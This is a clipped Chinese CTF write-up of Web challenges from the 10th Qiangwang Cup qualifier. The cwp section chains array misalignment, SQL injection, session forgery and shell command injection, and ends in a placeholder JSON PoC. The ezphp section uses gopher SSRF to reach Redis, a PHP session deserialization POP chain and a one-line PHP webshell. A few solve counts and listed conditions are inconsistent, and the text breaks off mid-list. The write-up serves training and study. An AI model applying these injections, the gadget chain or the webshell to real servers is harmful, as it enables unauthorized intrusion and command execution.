---
title: 【微信】第十届“强网杯”全国网络安全挑战赛初赛Web&Reverse WP（二）
source: https://mp.weixin.qq.com/s/snaq3hY0uGFKE3A8vsI4Sg
source_host: mp.weixin.qq.com
clip_date: 2026-11-01T20:07:32+08:00
trace_id: b96feb6f-b683-49e7-8cf2-63ebdddbf634
content_hash: de445d214b6da1f226f4fc348b5f577bb10770ea5193b290fb3925103cc60c21
status: synced
tags:
  - 微信
  - CTF
  - 漏洞分析
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: 第十届强网杯初赛Web与Reverse方向题解合集：串联SQL注入、SSRF+Redis反序列化、堆ROP、盲注提权等Web链，以及自解密Feistel、Unicorn模拟等逆向题。
ai_summary_style: key-points
images_status:
  total: 1
  succeeded: 1
  failed_urls: []
notion_page_id: 40b75244-d011-8187-98b0-fd2685c72254
ioc:
  cves: []
  cwes: []
  hashes:
    - 0c040489ce8a2b6194899cd3e01af0f8b9d3e9406e9b4948783104b55849015c
    - 13b1f7ec5beaefc781e43a3b344371cd49923a8a05edd71844b92f56f6a08d38
    - 1ac7df128e4f666bcfe64ba395b285ec69f54ab5e1fbf67b1a86f3bac77a8c36
    - 24998eacdca975e40ea56aaf0395ff8c5071016f9eae4d1a6a42f25f5db39171
    - 3049e67977c8f70f3965fd6cdddb03016456089b93d273ea02928bd5b72abd3d
    - 3b90a1a0b27769cf89b9c95e29b15d1cbfe39d169be692929670d72bc749d700
    - 451ec45592a604b2426f47ed9a0840f73ae51ca42bfaa33754f53fbcd73fdd3b
    - 4865f2079724968a95c217e0ff4db6c6
    - 4dfbab9993e5e8a92c6ed29b2f86c1dfef0c5a475de9fc37481253e79a5c029c
    - 559a63419fb92be76c8fc4a23d8f62b8
    - 7827b45b9013e92261f86a1150f32462
    - bc0445a68f9ac5ef6abc67eb1ab3a9d7ca1b727c219ff89c79fd3ac907b7651c
    - cc6bc929b72471e6094c50776b65ff91
    - dd97cb2de25cea1a8a9bc49b81abf9f4
    - dd97cb2de25cea1a8a9bc49b81abf9f49b085664ea73d293d58b92023dbd2ab7
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> 第十届强网杯初赛Web与Reverse方向题解合集：串联SQL注入、SSRF+Redis反序列化、堆ROP、盲注提权等Web链，以及自解密Feistel、Unicorn模拟等逆向题。
> 
> - **比赛概况：** 初赛共41题（PWN 17、Web 9、Misc 6、Crypto 6、Reverse 3），ELFStudy以1434队解出居首，vaultlink（1065队）、easytl（1059队）紧随，crp-12025无人解出。
> 
> - **Web-cwp：** bulk执行器数组错位使参数绕过白名单并触发SQL注入，借快照hook伪造staff身份，后台写入PHP文件后，利用空密钥会话与`sudo_until`短路攻入内网root管理服务读取flag。
> 
> - **Web-ezphp/ezstar：** ezphp以源码泄露+gopher SSRF打Redis未授权，污染PHP Session触发Guzzle FileCookieJar析构写WebShell；ezstar借OpenMCT的proxyUrl转发，对sgdecode用Golay全零码字令长度恒为0造成无界堆写，覆盖shared_ptr控制块，经setcontext执行dup2+system的ROP。
> 
> - **Web-ezcms：** NUL字节触发诊断页泄露SQL模板，利用PostgreSQL E-string反斜杠转义绕过过滤，布尔盲注dump出admins表无盐sha256（altair:freedom），登录后上传PNG+JSP多语种马getshell，再用SUID程序easycms-restore的命令替换提权root。
> 
> - **Reverse三题：** ELFStudy采用链式XOR自解密校验函数并叠加int3/TracerPid/link_map三重反调试，逆推30轮Feistel/ARX得到唯一flag；license需用Unicorn模拟SIGTRAP驱动的逐条指令解密（含输入字节混入密钥的约束），将三轮Feistel+GF(2)矩阵混合降为2^32查表枚举恢复48字节license；firmware经qemu-riscv32调试提取keymat，结合OTA内字节码常量与SM3派生，以SM4-CTR解密包尾flag。

**星宇Sec** *2026年11月1日 19:45*

Web & Reverse

为深入贯彻习近平总书记关于网络强国的重要思想，特别是习近平总书记关于网络安全工作“四个坚持”的重要指示精神，贯彻落实全国网络安全和信息化工作会议精神，创新网络安全人才培养模式，在中央网信办、河南省人民政府指导下，河南省委网信办、河南省教育厅、郑州市人民政府、信息工程大学、郑州大学联合主办第十届“强网杯”全国网络安全挑战赛，并于今日12:00正式完赛。 ![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/c759bc8aefa3a857.png)

本次强PWN杯线上初赛共41道题目，其中Misc 6道、Crypto 6道、Reverse 3道、PWN 17道、Web 9道。按比赛解题总榜数据，各题解出队伍数如下：

-   **Misc（6道）**
    

-   宇宙微波背景辐射：801队
    
-   0perator：285队
    
-   NeuronShuffle：630队
    
-   谍影重重7：406队
    
-   Dreambound：429队
    
-   问卷调查：895队（非技术题）
    

-   **Crypto（6道）**
    

-   frozen：874队
    
-   vmshare：899队
    
-   hoRRibleRing：606队
    
-   zkRSA：210队
    
-   crp-12025：272队
    
-   crp-11741：0队
    

-   **Reverse（3道）**
    

-   ELFStudy：1434队
    
-   firmware：438队
    
-   license：473队
    

-   **PWN（17道）**
    

-   babel：414队
    
-   babyark：399队
    
-   babysilent：538队
    
-   babystar：329队
    
-   Babyv8：282队
    
-   bad_puppet：180队
    
-   Blackout：167队
    
-   drywell：215队
    
-   easytl：1059队
    
-   HESEUS：196队
    
-   oldsvr：605队
    
-   ez_qemu：191队
    
-   CanonicoPWN：264队
    
-   hexachord：10队
    
-   What The Fox!：161队
    
-   shadowledger：273队
    
-   Ironclad：60队
    

-   **Web（9道）**
    

-   BlindReview：12队
    
-   cwp：1340队
    
-   ezphp：760队
    
-   ezstar：279队
    
-   ezcms：467队
    
-   Crack a Little Smile：231队
    
-   fault_web_and_fault_hash：133队
    
-   vaultlink：1065队
    
-   vaultlink_revenge：150队
    

## 第十届“强网杯” Web 与 Reverse 方向题解合集

本文整理本次比赛Web与Reverse方向的题目，按Web、Reverse顺序合并。

## Web2-cwp

### 1\. 题目信息

| 项目  | 内容  |
| --- | --- |
| 分类  | Web |
| 形态  | 混合题（容器+附件） |
| 附件  | blog-src_7827b45b9013e92261f86a1150f32462.zip |
| 目标  | 容器  |

Flag：flag{动态容器已脱敏}

### 2\. 题目分析

本题为一个PHP博客系统，完整利用链如下：

```rust
bulk 批量执行器数组错位
  -> 绕过参数声明与路由限制
  -> 触发 SQL 注入
  -> 利用快照 hook 重放伪造 staff 身份
  -> 写入 PHP 文件获得服务账户权限
  -> 攻击内网管理服务
  -> 伪造高权限会话并命令注入
  -> 以 root 身份读取目标文件
```

核心问题并非单一漏洞，而是执行器、鉴权、缓存和内部服务之间可以串接的信任边界错误。

#### 应用结构

SimpleBlog是一个单体PHP应用，源码可大致分为四层：

-   入口与路由层：单一入口接收请求，按 `route` 查表匹配处理器，并声明该处理器允许接收的参数；
    
-   处理器层：文章、标签、评论、用户等资源各自实现列表、详情、创建等动作；
    
-   数据层：文章以 `entry` 为实体，另有 `changeset` （变更集）、 `snapshot` （快照）以及按 `id` 索引的行缓存；
    
-   扩展层： `hooks` 按 `status_kind` 组合派发副作用，后台提供皮肤模板编辑与用户管理。
    

文章实体的关键字段为：

```
id, title, slug, owner, excerpt, created_at, status, kind, parent, snap_stale
```

其中 `status` 与 `kind` 并非展示字段，而是业务状态机的输入： `snap_stale = 1` 表示该行缓存与快照不一致、需要修复，修复完成后按 `status_kind` 触发hook。这一设计把"读数据"与"执行副作用"绑定在一起，是整条利用链的枢纽。

#### 批量接口

`/api/bulk` 允许一次提交多个操作，每个操作包含 `route` 、 `verb` 、 `data` ，外层另带 `policy` （如 `best-effort` ）。执行器分三步：绑定（把 `route` 解析成处理器）、校验（比对参数声明）、执行。问题在于绑定与校验的结果被写进两个独立数组，而执行阶段仍用原始下标读取，于是"构建失败的操作"成了数组错位的支点。

#### 信任边界

链上共有六个可以互相击穿的边界：

1.  批量执行器与路由声明之间——错位使未声明参数抵达处理器；
    
2.  处理器与SQL之间——类型分支不一致导致注入；
    
3.  缓存与业务语义之间——伪造行可以驱动hook；
    
4.  全局发布身份与真实认证之间——身份可被hook临时改写；
    
5.  后台与文件系统之间——模板内容原样落盘为可执行脚本；
    
6.  博客容器与内网管理服务之间——会话解析、权限判断与shell拼接均可控。
    

每步的产出恰好是下一步的输入：注入产出伪造行，伪造行产出staff身份，staff身份产出可写文件，文件产出容器内命令执行，容器内访问权限最终指向管理服务。因此本题的关键不是"找到某个漏洞"，而是理解这些边界为何能被串联。

### 3\. 解题过程

本节按因果顺序展开，重点说明每一步"为什么能进入下一步"。

#### Bulk执行器的数组错位

系统存在公开的批量操作入口，内部通过路由表把每个操作分发给对应handler。构建操作时，如果 `parse_url()` 返回 `false` ，该操作会被记录为错误：

```
if ($u === false) {
    return ["err" => op_err("route_unparseable")];
}
```

随后，批量执行器分别维护 `$matched` 与 `$checked` ：

```php
foreach ($ops as $op) {
    if (isset($op["err"])) {
        $checked[] = $op;
        continue;          // matched 不会追加
    }

    $matched[] = route_bind($op);
    $checked[] = op_check($matched[count($matched) - 1]);
}
```

但执行阶段仍使用同一个索引读取：

```php
foreach ($ops as $i => $op) {
    $bind    = $matched[$i];
    $verdict = $checked[$i];
}
```

只要队列中有一条构建失败的操作，两个数组就会错位：

> 第N条操作的参数，会被第N+1条操作对应的handler执行。

这使攻击者能够：

1.  把参数交给本不应该接收该参数的handler；
    
2.  绕过handler的参数白名单；
    
3.  访问通常禁止出现在批量请求中的内部路由。
    

两层嵌套批量请求即可把该错位放大到实际业务处理函数。

这里需要说明为什么必须是"两层"：最外层只负责把内层操作数组当作普通参数送达中间处理器，中间处理器（评论接口）会把 `data` 中的 `ops` 继续当作批量请求处理；真正携带注入参数的那条操作位于内层队列，它的参数最终由内层队列中下一条操作的处理器消费。由于外层 `policy` 为 `best-effort` ，单条操作失败不会中断整批，攻击者可以反复试错而不影响结果。探测时先用只读接口即可：若 `/api/articles` 返回的条数或字段随 `omit` 取值变化，就说明参数确实落到了目标处理器上，无需产生任何写入。

#### SQL注入

文章查询函数支持排除指定作者。参数为数组时会进行整数化处理，但参数为字符串时会直接进入 `implode()` ：

```php
if (!empty($spec["owner_not_in"])) {
    if (is_array($spec["owner_not_in"])) {
        $spec["owner_not_in"] = array_map("absint", $spec["owner_not_in"]);
    }

    $ids = implode(",", (array)$spec["owner_not_in"]);
    $conds[] = "owner NOT IN ($ids)";
}
```

由于字符串会被转换为单元素数组，最终形成：

```
owner NOT IN (0) AND 1=0 UNION SELECT ... -- -
```

查询结果共有10列：

```
id, title, slug, owner, excerpt,
created_at, status, kind, parent, snap_stale
```

通过数组错位，将未在 `/api/tags` 中声明的 `omit` 参数交给 `/api/articles` ，即可完成注入并直接回显查询结果。

注入能成立依赖三个条件叠加：其一， `omit` 不在 `/api/tags` 的声明列表中，正常请求会被校验丢弃，只有错位才能把它送达；其二， `owner_not_in` 的整数化只作用于数组分支，字符串分支直接 `implode` ，等于把原文拼进SQL；其三，联合查询必须与原始查询的10列严格对齐，否则结果集无法映射回文章对象。回显则是列表接口的天然能力：注入行会像真实文章一样被序列化成JSON，攻击者只需读取对应字段即可。借助这一点，可以先枚举出一个真实staff的登录名，为下一步的身份伪造准备素材；也可以把库名、版本等信息放在相同列位读出，确认当前数据库方言后再构造后续语句。

#### 从SQL注入到身份伪造

查询结果会按 `id` 写入行缓存。文章列表处理结束后，系统会对 `snap_stale = 1` 的缓存行执行快照修复：

```php
$full = entry_fetch((int)$r["id"]);

if ($full && (int)$full["snap_stale"] === 1) {
    snapshot_write($full);
}
```

`snapshot_write()` 在更新后会根据 `status_kind` 触发hook：

```bash
hooks_fire($full["status"] . "_" . $full["kind"], $full);
```

因此，SQL注入不仅能读取数据，还能构造带业务语义的伪造行：

| id  | owner | status | kind | snap_stale |
| --- | --- | --- | --- | --- |
| 大整数A | 真实staff用户名 | `pending` | `changeset` | 1   |
| 大整数B | 任意值 | `api` | `reload` | 1   |

两行分别触发：

1.  `pending_changeset`
    

-   创建changeset；
    
-   如果owner是真实staff，则把全局发布身份设置为该用户。
    

3.  `api_reload`
    

-   重新执行当前批量请求中的操作；
    
-   此时staff权限检查读取的正是被伪造的全局身份。
    

两行的 `id` 取极大值，是为了在行缓存中占据独立键位、不覆盖真实文章； `snap_stale = 1` 则保证列表处理结束后一定进入快照修复分支。顺序同样重要： `pending_changeset` 必须先被消费，把全局发布身份改成真实staff， `api_reload` 才有意义；重放发生时， `/api/users` 这条创建用户请求会重新走一遍鉴权，而鉴权读到的已是被污染的身份。整个创建过程没有经过任何登录，等价于匿名写入了一个"伪匿名用户"——它在系统里是合法staff，在认证记录里却找不到对应的登录事件。这个账号是后续进入后台的唯一凭据，因此登录名与口令都必须由攻击者自己掌握。

于是可以匿名调用创建用户的员工接口，注册一个可控staff账号。示意payload见第4节，其中 `ERR_ROUTE` 表示任何能使 `parse_url()` 返回 `false` 的占位值， `SQL_INJECTION` 为上文构造的联合查询。

#### 写入PHP并获得命令执行

获得staff会话后，后台皮肤编辑器会把名称和代码原样写入Web可访问目录，并固定追加`.php` 后缀：

```bash
$path = "$dir/$name.php";
file_put_contents($path, $code);
```

提交：

```
name=<合法文件名>
code=<PHP 代码>
```

即可写入一个可执行PHP文件，获得Web服务账户权限：

```
id
whoami
```

该账户权限不足以直接读取最终目标，因此需要继续攻击内部管理服务。

模板写入的危险来自三个"不做校验"的叠加：文件名只做最宽松的合法性判断、扩展名由服务端强制拼接为`.php` 、内容不做任何语法或危险函数过滤。写入目录位于Web根之下，落盘即可通过URL直接请求，不需要额外的包含或解析技巧。落地脚本执行 `id` 、 `whoami` 、 `ls` 即可确认运行身份；通常该身份是Web服务账户，对 `/root` 既无目录遍历权限也无文件读取权限，目标文件自然读不到。这一步的价值不是拿flag，而是取得一个位于容器内、既能出网也能访问内网的可控执行点。

#### 内网管理服务利用

拿到命令执行后，第一件事是确认自己处在哪张网络里：查看主机名、路由表、监听端口与 `/etc/hosts` ，通常会发现在目标主机或相邻地址上还有一个只对内网开放的管理服务。它与博客不是同一套代码，拥有独立的会话机制和更高的运行权限，正好补上Web账户缺失的那部分权限。

##### 未授权源码泄露

管理服务暴露了源码查看接口：

```
/ops/code
```

该接口没有权限检查，可直接获得服务端实现，进而确认会话、鉴权和命令执行逻辑。

源码泄露的意义在于把黑盒变成白盒：cookie的拼接格式、会话的反序列化方式、权限判定的先后顺序、以及哪些接口直接调用shell，都能从实现中读出，后续每一步都不必盲猜。

##### 会话状态明文写入

会话cookie的格式可抽象为：

```
hpx_id=<token>,<scramble>
```

当逗号后的 `scramble` 为空时，服务仍认为请求携带了会话加密参数，但实际密钥为空，导致会话值以明文写入。

此外，Basic Auth分支没有过滤换行，因此可在凭据中注入额外的键值：

```
root:<value>
master_flag=1
otp_done=1
sudo_until=<未来时间>
```

这些内容会被会话解析器拆成多个状态字段。

关键在于两个缺陷配合：后端只判断"cookie里有没有加密参数"，却不校验该参数是否为空，于是加密函数以空密钥工作，序列化后的会话状态几乎等于明文；而Basic Auth解析只按冒号与换行切分，未过滤控制字符， `pass` 中夹带的换行会被当成新的记录边界。由此写入的 `master_flag` 、 `otp_done` 分别跳过主控开关与二次验证， `sudo_until` 则对应下面的权限短路。

##### 刷新缓存并成为高权限用户

会话读取逻辑会缓存解析结果，而写入逻辑不会立即让缓存失效。访问一个zone不匹配的地址可以触发重新扫描：

```
<不匹配的 zone 路径>
```

重新扫描后，注入的字段进入当前会话状态。高权限判断中存在 `sudo_until` 短路逻辑：

```ruby
if (defined $s->{sudo_until}
    && $s->{sudo_until} =~ /^\d+$/
    && $s->{sudo_until} > time()) {
    return 1;
}
```

因此无需通过正常认证，即可把会话提升为高权限状态。

这里有一个时序细节：写入走的是另一条代码路径，只更新存储、不令缓存失效，所以注入完成后立即访问正常页面，读到的仍是旧缓存，表现为"注入成功但权限没变"。zone不匹配的请求会迫使服务重新扫描并解析会话，新增字段此时才进入内存状态；确认权限生效后，再用正常路径访问即可。 `sudo_until` 的短路分支位于密码与OTP检查之前，一旦命中就直接返回真，这才是无需口令也能获得管理权限的根本原因。

##### 命令注入

文件列表接口直接把 `path` 参数拼接到shell命令中：

```swift
my $dir = $qs{path} // $DEFAULT_DIR;
open my $fh, "-|", "/bin/sh", "-c", "ls -la " . $dir;
```

向 `path` 中注入命令后，命令以管理服务权限执行，最终读取受保护的目标文件。

拼接方式决定了利用形态： `ls -la`  只是命令前缀，用分号或管道即可闭合，后面的部分作为新命令执行；由于管理服务以root运行，命令继承了同样的权限，对 `/root` 的遍历限制不复存在。先列出目录确认文件名，再读出内容，输出会随接口响应原样返回，得到flag{动态容器已脱敏}形态的结果。至此整条链闭环：从匿名请求开始，经数组错位、SQL注入、伪造快照行、身份重放、后台文件写入，最终在更高权限的进程上下文里落地。

### 4\. PoC

```json
{
  "policy": "best-effort",
"ops": [
    {"route": "ERR_ROUTE", "verb": "POST"},
    {
      "route": "/api/articles/1/comments",
      "verb": "POST",
      "data": {
        "id": 1,
        "author": "",
        "text": "",
        "ops": [
          {"route": "ERR_ROUTE", "verb": "GET"},
          {
            "route": "/api/tags",
            "verb": "GET",
            "data": {"omit": "SQL_INJECTION"}
          },
          {"route": "/api/articles", "verb": "GET"},
          {
            "route": "/api/users",
            "verb": "POST",
            "data": {
              "login": "NEW_LOGIN",
              "pass": "NEW_PASSWORD"
            }
          }
        ]
      }
    },
    {"route": "/api/bulk", "verb": "POST"}
  ]
}
```

* * *

## Web3-ezphp

### 1\. 题目信息

| 项目  | 内容  |
| --- | --- |
| 分类  | Web |
| 形态  | 容器题 |
| 附件  | 无（题目仅提供靶机） |
| 目标  | 容器  |

Flag：flag{动态容器已脱敏}

### 2\. 题目分析

这是一道以PHP应用为入口的组合型Web题，主要涉及：

-   PHP源码泄露
    
-   SSRF
    
-   gopher协议利用
    
-   内网Redis未授权访问
    
-   PHP Session污染
    
-   PHP反序列化
    
-   第三方依赖POP链
    
-   任意文件写与WebShell
    

总体利用链：

```
源码泄露
    ↓
发现仅允许访问环回地址的 SSRF
    ↓
利用过滤遗漏，通过 gopher 访问内网 Redis
    ↓
定位 Redis 中保存的 PHP Session
    ↓
伪造包含序列化对象的 Session 数据
    ↓
请求应用，触发 session_start() 反序列化
    ↓
利用应用依赖中的文件写 POP 链
    ↓
向 Web 可访问、可执行的目录写入 WebShell
    ↓
获得命令执行并读取最终目标文件
```

#### 链条各环节的作用

这条链能闭合，是因为每一环都为下一环提供了必要能力：

1.  源码泄露解决信息缺失。只有看到源码，才能确定SSRF的参数名、主机校验方式、协议黑名单、Session存储后端与依赖版本，否则后续构造只能盲猜。
    
2.  环回地址限制把SSRF从“任意出网”压缩成“只能打目标主机”，而目标主机恰好运行着Redis与应用本身，限制反而把攻击面集中到了内网服务。
    
3.  协议黑名单只覆盖 `http` 、 `https` 、 `file` 、 `dict` 等常见协议，遗漏了 `gopher` ，于是SSRF从“发一条HTTP请求”升级为“发送任意TCP字节流”，可以手工实现Redis的RESP协议。
    
4.  Redis无认证意味着不需要口令即可读写键；管理命令被裁剪只影响“直接写文件、改配置”这类路径，不影响对Session键的读写。
    
5.  应用把PHP Session存在Redis中，外层格式由 `session.serialize_handler` 决定，攻击者写入的键值会被 `session_start()` 原样解码，其中的对象随即被反序列化。
    
6.  依赖中存在析构期写文件的类，对象释放时自动执行写文件，不需要业务代码显式调用，反序列化因此直接变成任意文件写。
    
7.  落点选择决定文件写能否升级为代码执行，路径必须同时满足可写、可HTTP访问、被PHP解析、不被路由或访问控制拦截。
    
8.  取得命令执行后还要区分构建期写入的固定诱饵与运行期注入的真实目标，才能拿到有效flag。
    

#### 容易忽略的前提

-   容器启动约一分钟，Web与Redis不一定同时就绪，探测阶段需要重试，而不是一次失败就放弃。
    
-   题面直接问“how 2 shell”，说明读取类漏洞只是铺垫，最终必须落到命令执行。
    
-   Session ID必须符合PHP默认字符集（字母、数字及少量符号），否则 `session_start()` 会丢弃该SID，恶意数据根本不会被读取。
    
-   文件写链的输出往往经过JSON编码，WebShell必须避开引号与反斜杠，否则落地的是语法错误而非可执行代码。
    

### 3\. 解题过程

#### 从源码泄露入手

首先检查题目提供的PHP页面、报错页面以及可能存在的源码高亮功能。

源码中可以重点关注以下内容：

1.  是否根据来源IP判断请求来自目标主机。
    
2.  是否根据User-Agent、Referer或其他请求头进入特殊分支。
    
3.  是否接收URL参数并由服务端发起请求。
    
4.  对URL的过滤是白名单还是黑名单。
    
5.  是否只校验主机名，而没有严格限制协议。
    

本题源码中存在一个服务端请求功能。它限制目标主机必须是环回地址，但对协议采用了不完整的黑名单过滤，遗漏了 `gopher://` 。

这意味着虽然不能直接访问任意外部主机，但可以把该功能当作一个通往目标主机TCP服务的入口。

实际审计可以按“入口—过滤—依赖”三段推进：

-   入口：页面存在一个用于展示自身代码的参数，或残留了编辑器备份、 `~` /`.bak` /`.swp` 后缀文件，用 `php://filter/convert.base64-encode/resource=index` 一类方式即可读出完整源码，且不会执行它。
    
-   过滤：处理逻辑先用 `parse_url()` 取出host，再与<靶机地址>、 `localhost` 比较，协议部分用 `in_array()` 做黑名单。黑名单是穷举式的，天然容易漏项。
    
-   依赖： `composer.json` 与 `composer.lock` 暴露完整依赖树，可直接判断哪些版本存在公开反序列化链，同时能看到Session配置从环境变量读取并指向目标主机Redis。
    

另外，读取分支判断的是 `REMOTE_ADDR` 是否为环回地址。SSRF由服务端自己发起请求，源地址天然是<靶机地址>，这个条件可以被直接满足，它只能证明“目标主机可读”，不能证明“已经拿到最终答案”。

#### 不要把内网读取结果直接当作最终答案

源码中还存在一个“仅目标主机请求可访问”的读取分支。通过SSRF配合伪造请求头，可以进入这个分支并取得一个看起来很像答案的字符串。

但这类结果需要继续验证，不能看到符合flag格式的内容就立即停止。

判断是否为诱饵时，可以检查：

-   内容是否为固定的提示性字符串。
    
-   文件位置是否更像题目内置资源，而非平台运行时注入位置。
    
-   题目标题是否明确暗示需要取得Shell。
    
-   容器中是否可能同时存在“构建时固定值”和“运行时动态值”。
    
-   提交平台是否接受该值。
    

如果题目明确要求进一步利用，那么目标主机读取通常只是提示下一阶段入口，而不是最终目标。

#### 使用gopher将SSRF扩展为原始TCP客户端

普通的HTTP SSRF只能发送HTTP请求，而gopher可以近似发送攻击者控制的原始TCP字节流。

其基本形式为：

```
gopher://<靶机地址>:<port>/_<percent-encoded-payload>
```

例如，要测试Redis，可以发送一条RESP或Redis Inline Protocol格式的 `PING` 请求。

如果返回：

```
+PONG
```

即可确认目标主机运行着可访问的Redis。

后续应继续确认：

-   Redis是否需要认证。
    
-   哪些命令可用。
    
-   危险管理命令是否被删除或重命名。
    
-   应用是否使用Redis保存缓存、锁或PHP Session。
    

即使 `CONFIG` 、 `KEYS` 、 `SCAN` 等命令被禁用，只要 `GET` 、 `SET` 等基础命令仍可用，就可能通过污染应用数据继续利用。

编码细节上还有两点容易出错：gopher的payload进入socket前只解码一次，百分号编码只能做一层，做两层会让Redis收到字面量 `%2A` 并直接报协议错误；RESP的定长必须严格， `*N` 后要跟N个 `$len` 块，长度按字节而非字符计算，任何一处不符都会导致后续命令错位。

#### 定位Redis中的PHP Session

访问应用的登录页或其他会启动Session的页面，记录服务器返回的Session Cookie。

通常可以获得：

```
Set-Cookie: <session-cookie-name>=<session-id>
```

然后根据常见Redis Session键格式测试候选键，例如：

```
PHPREDIS_SESSION:<session-id>
```

获取SID的方式是访问任意会调用 `session_start()` 的页面（登录页最稳妥），从响应头中挑出值形如24到64位十六进制或字母数字的Cookie，其余明显属于前端或安全模块的Cookie可以先排除。

还有一个容易忽略的点：若 `session.use_strict_mode=1` ，PHP会拒绝从未存在过的SID，直接写入的键不会被读取。应对办法是先正常访问一次，让应用为该SID落一次真实Session，再用恶意值覆盖同一个键；本题环境未开启严格模式，因此可以跳过这一步。

如果读取结果呈现如下结构：

```
variable_name|s:<length>:"...";
```

则说明PHP使用的是 `php` Session序列化格式。

其基本规则为：

```
变量名|serialize(变量值)
```

例如：

```
name|s:5:"value";
```

应用可能会对自己的Session变量进行二次加密，但这不代表PHP Session外层整体不可控。

只要攻击者能直接修改Redis中的Session值，就可以增加一个新的变量：

```
controlled_name|<serialized-object>
```

当PHP执行 `session_start()` 时，会自动解析该Session，并对其中的对象执行反序列化。

#### 寻找应用依赖中的POP链

下一步是确定目标应用加载了哪些Composer依赖，并寻找可用的PHP反序列化Gadget Chain。

常见检查方向包括：

-   Guzzle
    
-   Monolog
    
-   Symfony组件
    
-   Doctrine
    
-   Laravel组件
    
-   应用自身带有魔术方法的类
    

本题环境中可以利用HTTP客户端依赖里的文件Cookie持久化类。该类在对象析构时，会把内存中的Cookie数据序列化并写入指定文件。

因此可以构造一个对象，使其属性指向：

-   攻击者控制的文件名
    

当对象触发析构时，即可实现任意文件写。

以Guzzle的 `FileCookieJar` 为例， `save()` 在析构阶段被调用，流程是：先清理过期Cookie，再把 `cookies` 数组整体 `json_encode` ，最后 `file_put_contents` 到 `filename` 指定路径。构造时需同时满足三点：

-   `filename` 指向目标PHP路径；
    
-   每个 `SetCookie` 的 `data` 补齐 `Expires` 、 `Discard` 、 `Value` 等键， `Value` 才是真正写进文件的字符串。
    

由于最终是JSON， `Value` 中的双引号会被转义成 `\"` 、反斜杠会被转义成 `\\` ，这正是后面WebShell必须避免引号的根本原因。

使用通用PHP Gadget工具时，应优先选择：

-   与目标依赖版本兼容的文件写链。
    
-   支持fast-destruct的生成方式。
    
-   能够生成ASCII安全序列化数据的选项。
    

fast-destruct很重要，因为它可以让Gadget在Session解码阶段尽快触发，减少对象被应用后续逻辑覆盖或清理的影响。

#### 构造恶意Session

选择一个符合PHP Session ID字符集要求的自定义SID，然后构造对应的Redis键：

```
PHPREDIS_SESSION:<controlled-sid>
```

Session值可以采用：

```
pwn|<serialized-gadget>
```

这里的 `pwn` 是变量名，后面的序列化串是变量值，PHP解码时会按该变量名恢复对象。为了让对象在解码阶段就被释放，序列化串外层再包一层数组，并让同一个整数键出现两次：

```css
a:2:{i:7;<gadget>i:7;i:7;}
```

解析第二个 `i:7` 时，第一个值被覆盖并立即释放， `__destruct` 在 `unserialize()` 内部就执行完毕，不必等到脚本结束。这一点很关键：Session解码后应用还会继续写自己的变量并回写Redis，若Gadget拖到请求末尾才析构，很可能已被清理。

Redis的 `SET` 请求使用RESP编码，建议再追加一个 `EXPIRE` 请求，为测试Session设置合理的有效期。完整报文与编码脚本见第4节。

将整段RESP数据逐字节百分号编码，再放入gopher URL中，通过SSRF发送给Redis。

#### 触发Session反序列化

Redis写入成功后，用自定义SID请求一个会启动PHP Session的页面，请求示例见第4节。

服务器端的处理过程为：

```
从 Cookie 读取 SID
    ↓
Session Handler 从 Redis 读取对应键
    ↓
session_start() 解码 Session 数据
    ↓
反序列化攻击者构造的对象
    ↓
触发 Gadget 的魔术方法或析构方法
```

触发后，可以重新读取Redis中的Session值进行验证。

如果恶意对象已经被fast-destruct消费，并且应用又在同一Session中写入了自己的正常变量，通常说明：

-   自定义SID被应用接受。
    
-   Redis Session键名正确。
    
-   PHP成功解码了恶意Session。
    
-   Gadget的析构流程已经执行。
    

#### 选择正确的文件落点

拥有任意文件写并不等于立刻拥有命令执行。目标路径必须同时满足：

1.  PHP/Web用户对目录具有写权限。
    
2.  文件能通过HTTP访问。
    
3.  Web服务器会把该文件交给PHP解释器处理。
    
4.  目录没有禁止脚本执行。
    
5.  请求不会被应用的路由重写成统一的404页面。
    

应根据目标应用的目录结构寻找：

-   应用扩展目录
    
-   插件目录
    
-   兼容性接口目录
    
-   公开资源目录的可执行子目录
    
-   Web根目录下由运行用户维护的目录
    

本题最终选择兼容接口目录下的点文件，例如 `ocs-provider/.cache.php` 。它满足全部条件：目录属主是Web运行用户，可直接创建文件；该目录由Web服务器直接映射，不经过前端控制器；`.php` 后缀会交给PHP-FPM解析；点文件不在路由规则内，不会被改写成统一404。

反过来， `data/` 、 `config/` 这类目录通常自带`.htaccess` 或 `Require all denied` ，写入成功也访问不到；上传目录往往禁止执行脚本；应用根目录的固定入口文件则可能被框架的rewrite规则拦截。因此落点要靠“先写小文件探测、再正式写入”确定，而不是凭经验押注。

测试时不要只判断“文件是否成功写入”，还要分别验证：

-   写入是否成功
    
-   HTTP状态是否正确
    
-   PHP是否被执行
    
-   输出是否被应用路由或访问控制覆盖
    

#### 注意文件写Gadget的编码副作用

某些文件写链并不是原样写入字符串，而是先将对象内容编码为JSON、日志格式或其他结构。

如果PHP代码位于JSON字符串中，代码里的引号和反斜杠可能被转义，例如：

```
"  →  \"
\  →  \\
```

这会导致最终落地的PHP文件出现语法错误。

因此WebShell应尽量满足：

-   不使用字符串字面量。
    
-   不使用单引号或双引号。
    
-   不使用不必要的反斜杠。
    
-   代码尽可能短。
    

一种通用思路是通过字符编码函数动态构造参数名，而不是直接写字符串：

```php
<?php system($_GET[chr(<ascii-code>)]); ?>
```

这里的ASCII值应替换为实际需要的参数字符。这样可以减少JSON转义破坏PHP语法的风险。

#### 验证命令执行

WebShell写入后，先执行无副作用的验证命令，例如：

```
id
whoami
pwd
```

确认命令执行后，再进行以下检查：

-   当前运行用户及其权限。
    
-   Web根目录和应用目录结构。
    
-   环境变量。
    
-   容器初始化脚本。
    
-   运行时挂载点。
    
-   可能由平台动态注入的目标文件。
    

本题的定位过程可以概括为：先用 `id` 、 `pwd` 确认权限与工作目录，再用 `ls -la /` 和 `cat /proc/1/cmdline` 找到启动脚本，从脚本中看出真实flag是运行期写入某个路径或由环境变量生成；随后用 `env` 以及按修改时间筛选的方式，找出修改时间接近容器启动时间的文件，读取后得到flag{动态容器已脱敏}。

与之相对，源码中那个“目标主机可读”的固定资源是构建期就存在的提示，格式再像flag也不应作为提交值。区分标准只有一条：它是否由运行时初始化流程产生，是否与容器启动时间、环境变量或挂载点相关联。

如果存在多个看起来像答案的文件，应结合以下信息判断真实目标：

-   初始化脚本如何写入动态值。
    
-   文件修改时间与容器启动时间是否一致。
    
